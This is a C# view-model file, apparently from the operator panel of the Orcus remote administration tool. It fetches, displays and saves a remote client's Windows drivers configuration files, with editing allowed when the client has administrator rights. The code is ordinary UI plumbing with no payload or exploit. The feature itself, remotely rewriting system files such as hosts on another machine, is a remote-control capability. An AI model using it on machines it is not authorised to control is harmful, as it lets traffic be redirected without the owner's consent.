using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using Orcus.Administration.Commands.WindowsDrivers;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.WindowsDrivers;
using Orcus.Shared.Commands.WindowsDrivers;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(16)]
    public class WindowsDriversViewModel : CommandView
    {
        private Dictionary<WindowsDriversFile, DriverConfigurationViewModel> _driverConfigurationDictionary;
        private List<DriverConfigurationViewModel> _driverConfigurationViewModels;
        private RelayCommand<WindowsDriversFile> _refreshCommand;
        private RelayCommand<WindowsDriversFile> _saveFileCommand;
        private WindowsDriversCommand _windowsDriversCommand;

        public override string Name { get; } = (string) Application.Current.Resources["DriversConfig"];
        public override Category Category { get; } = Category.System;

        public bool CanEdit { get; set; }

        public List<DriverConfigurationViewModel> DriverConfigurationViewModels
        {
            get { return _driverConfigurationViewModels; }
            set { SetProperty(value, ref _driverConfigurationViewModels); }
        }

        public RelayCommand<WindowsDriversFile> SaveFileCommand
        {
            get
            {
                return _saveFileCommand ??
                       (_saveFileCommand =
                           new RelayCommand<WindowsDriversFile>(
                               parameter =>
                               {
                                   _windowsDriversCommand.EditDriversFile(parameter,
                                       _driverConfigurationDictionary[parameter].Content);
                               }));
            }
        }

        public RelayCommand<WindowsDriversFile> RefreshCommand
        {
            get
            {
                return _refreshCommand ??
                       (_refreshCommand =
                           new RelayCommand<WindowsDriversFile>(
                               parameter => { _windowsDriversCommand.GetDriversFile(parameter); }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _windowsDriversCommand = clientController.Commander.GetCommand<WindowsDriversCommand>();
            _windowsDriversCommand.DriversFileContentReceived += WindowsDriversCommandOnDriversFileContentReceived;

            CanEdit = clientController.Client.IsAdministrator || clientController.Client.IsServiceRunning;
        }

        private void WindowsDriversCommandOnDriversFileContentReceived(object sender,
            DriversFileContentReceivedEventArgs driversFileContentReceivedEventArgs)
        {
            _driverConfigurationDictionary[driversFileContentReceivedEventArgs.WindowsDriversFile].Content =
                driversFileContentReceivedEventArgs.Content;
        }

        public override void LoadView(bool loadData)
        {
            base.LoadView(loadData);
            _driverConfigurationDictionary =
                Enum.GetValues(typeof(WindowsDriversFile))
                    .Cast<WindowsDriversFile>()
                    .ToDictionary(x => x, y => new DriverConfigurationViewModel(y));

            DriverConfigurationViewModels = _driverConfigurationDictionary.Select(x => x.Value).ToList();
            _windowsDriversCommand.GetAllDriverFiles();
        }
    }
}